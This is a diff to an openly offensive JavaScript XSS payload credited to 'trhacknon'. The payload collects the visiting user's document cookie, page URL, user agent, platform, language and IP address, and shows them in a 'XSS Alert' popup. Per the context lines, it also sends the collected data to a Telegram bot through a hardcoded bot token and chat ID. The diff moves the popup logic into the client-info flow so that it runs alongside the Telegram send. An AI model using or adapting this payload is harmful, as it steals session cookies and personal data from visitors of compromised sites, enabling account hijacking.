@@ -1,11 +1,34 @@
 var tokenBot = '6003683438:AAEHevPU8UW5paysUEZUsq0FbiaBzdjQQLw'; // Your "tokenBot" Here
 var chatId = '-1001690993326'; // Your "chatId" Here
 
-function getIPAddress(callback) {
-    fetch('https://api64.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => callback(null, data.ip))
-        .catch(error => callback('Failed to fetch IP address', null));
+function showXSSPopup(ipAddress) {
+    var info = `
+XSS Alert by trhacknon
+------------------------
+
+- URL Target -
+${document.location.hostname}${document.location.pathname}
+
+- Document Cookie -
+${document.cookie}
+
+- User Agent -
+${navigator.userAgent}
+
+- Platform -
+${navigator.platform}
+
+- Language -
+${navigator.language}
+
+- Online Status -
+${navigator.onLine}
+
+- IP Address -
+${ipAddress}
+`;
+
+    alert(info);
 }
 
 function getClientInfo() {
@@ -39,6 +62,7 @@ function getClientInfo() {
             info += `<b>- IP Address -</b>\n<pre>Error: ${ipError}</pre>`;
         } else {
             info += `<b>- IP Address -</b>\n<pre>${ipAddress}</pre>`;
+            showXSSPopup(ipAddress); // Appel de la fonction pour afficher le popup avec l'adresse IP
         }
 
         telegramSend(info);
@@ -50,41 +74,5 @@ function telegramSend(textData) {
         .catch(error => console.error('Failed to send message to Telegram:', error));
 }
 
-function showXSSPopup() {
-    var info = `
-XSS Alert by trhacknon
-------------------------
-
-- URL Target -
-${document.location.hostname}${document.location.pathname}
-
-- Document Cookie -
-${document.cookie}
-
-- User Agent -
-${navigator.userAgent}
-
-- Platform -
-${navigator.platform}
-
-- Language -
-${navigator.language}
-
-- Online Status -
-${navigator.onLine}
-`;
-
-    getIPAddress(function (ipError, ipAddress) {
-        if (ipError) {
-            info += `<b>- IP Address -</b>\n<pre>Error: ${ipError}</pre>`;
-        } else {
-            info += `<b>- IP Address -</b>\n<pre>${ipAddress}</pre>`;
-        }
-
-        alert(info);
-    });
-}
-// Appeler la fonction pour afficher le popup XSS
-
+// Appeler la fonction pour obtenir les informations client
 getClientInfo();
-showXSSPopup();
